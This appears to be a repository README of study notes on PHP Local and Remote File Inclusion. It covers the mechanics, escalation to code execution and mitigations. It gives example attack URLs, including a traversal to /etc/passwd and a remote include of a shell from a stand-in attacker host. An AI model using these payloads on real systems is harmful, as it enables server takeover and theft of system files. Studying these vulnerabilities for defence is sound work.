File Inclusion Vulnerabilities: LFI & RFI Guide

This repository contains a comprehensive guide and study notes on File Inclusion (FI) vulnerabilities, focusing on their mechanisms, exploitation techniques, and mitigation strategies.
📌 Overview

File Inclusion vulnerabilities occur when a web application allows a user to control the path of a file that is included or executed by the application. This typically happens in languages like PHP through functions such as include(), require(), include_once(), and require_once().
🔍 Key Concepts
1. Local File Inclusion (LFI)

LFI occurs when an attacker can trick the application into exposing or running files stored locally on the server.

    Common Target: /etc/passwd, /var/www/html/config.php.

    Technique: Path Traversal (using ../../ to navigate outside the intended directory).

    Example: https://example.com/view?page=../../../../etc/passwd

2. Remote File Inclusion (RFI)

RFI allows an attacker to include a script from an external server (via a URL). This is often more critical as it leads directly to Remote Code Execution (RCE).

    Condition: Requires allow_url_include to be set to On in the PHP configuration.

    Example: https://example.com/view?page=http://attacker.com/malicious_shell.php

🚀 From LFI to RCE (Remote Code Execution)

LFI is not just about reading files; it can be upgraded to full server takeover via:

    Log Poisoning: Injecting PHP code into server logs (Access logs) and then including that log file via LFI.

    PHP Wrappers: Using php://filter to read source code or data:// to execute base64 encoded strings.

    File Uploads: Uploading a malicious image (with embedded PHP) and calling it via LFI.

🛡️ Mitigation & Prevention

To secure applications against File Inclusion attacks, follow these best practices:

    Input Validation: Use an Allow-list of approved files. Never trust user-supplied paths.

    Server Configuration:

        Set allow_url_fopen = Off

        Set allow_url_include = Off

    Filesystem Permissions: Run the web server with the least privilege and use chroot jails to isolate the application.

    Avoid Dynamic Includes: Use static file mapping instead of passing user input directly into include functions.

📖 Learning Objectives Summary

    [x] Difference between LFI and RFI.

    [x] Understanding the use of ../../ in Path Traversal.

    [x] Upgrading LFI to RCE via Log Poisoning or Wrappers.

    [x] Implementing effective Whitelisting and Sanitization.

🔗 References

    OWASP File Inclusion Criteria

    PHP Manual: include()

    PayLoadsAllTheThings - File Inclusion
